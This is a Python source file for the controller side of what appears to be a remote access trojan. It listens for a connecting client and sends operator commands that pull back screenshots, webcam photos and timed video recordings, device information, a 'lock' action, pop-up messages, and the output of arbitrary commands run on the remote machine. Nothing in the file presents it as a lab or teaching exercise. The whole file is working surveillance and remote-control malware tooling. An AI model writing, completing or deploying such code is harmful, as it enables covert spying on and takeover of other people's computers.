import socket
import os
from datetime import datetime as dt
import base64
import zlib
import time
import sys


IP = sys.argv[1]
PORT = int(sys.argv[2])
active = True
conn = None

# Set up the socket
sock = socket.socket()
sock.bind((IP, PORT))
sock.listen(2)
print("Server listening for incoming connections...")

# Compress data
def zdecomp(data):
    """ Decompress the received data. """
    try:
        return zlib.decompress(data)
    except Exception as e:
        print(f"Error decompressing data: {e}")
        return b""


# Wait for a connection
def handle_client_connection():
    try:
        conn, addr = sock.accept()
        print(f"{addr} has connected.")
        while active:
            try:
                command = input("[+] Enter command: ")
                if len(command) < 1:
                    print("No command ..")
                    return

                if command == "lock":
                    conn.send(command.encode())
                    fsize = int(zdecomp(conn.recv(1024)).decode("utf-8"))
                    enc = conn.recv(fsize)
                    print(zdecomp(enc).decode("utf-8"))

                elif command == "capture_screenshot":
                    conn.send(command.encode())
                    print("receiving file size ...")
                    fsize = int(zdecomp(conn.recv(1024)).decode("utf-8"))
                    print("File Size: ", fsize)
                    enc = conn.recv(fsize)
                    dec = zdecomp(enc)
                    filename = str(dt.now()).replace(":", "-") + ".png"
                    with open(filename, 'wb') as save:
                        save.write(dec)
                    print(f"Saved to {filename}")

                elif command == "capture_camera":
                    conn.send(command.encode())
                    fsize = int(zdecomp(conn.recv(1024)).decode("utf-8"))
                    enc = conn.recv(fsize)
                    print("File Size: ", fsize)
                    dec = zdecomp(enc)
                    filename = str(dt.now()).replace(":", "-") + ".png"
                    with open(filename, 'wb') as save:
                        save.write(dec)
                    print(f"Saved to {filename}")

                elif "record_video" in command.lower():
                    try:
                        sleep_time = float(command.split()[1])
                        conn.send(command.encode())
                        time.sleep(sleep_time*60) # time in minutes -- wait for video to finish recording... 
                        fsize = int(zdecomp(conn.recv(1024)).decode("utf-8"))
                        enc = conn.recv(fsize)
                        print("File Size: ", fsize)
                        dec = zdecomp(enc)
                        filename = str(dt.now()).replace(":", "-") + ".avi"
                        with open(filename, 'wb') as save:
                            save.write(dec)
                        print(f"Saved to {filename}")
                    except ValueError as ve:
                        print("Invalid time specified ...")


                elif command == "send_info":
                    conn.send(command.encode())
                    fsize = int(zdecomp(conn.recv(1024)).decode("utf-8"))
                    enc = conn.recv(fsize)
                    print("Device Info: ", zdecomp(enc).decode("utf-8"))
                elif "show_message" in command.lower():
                    conn.send(command.encode())
                else:
                    conn.send(command.encode())
                    fsize = int(zdecomp(conn.recv(1024)).decode("utf-8"))
                    enc = conn.recv(fsize)
                    print(zdecomp(enc).decode("utf-8"))

            except ConnectionError as e:
                print(f"Error during command execution: {e}")
                conn.detach()
            
                

    except Exception as e:
        print(f"Error handling client connection: {e}")
    finally:
        conn.close()
        print("Connection closed.")

# To handle reconnection attempts and socket failures
def reconnect_server():
    while True:
        try:
            handle_client_connection()
        except Exception as e:
            print(f"Error: {e}, retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    # Start handling the client connection
    reconnect_server()
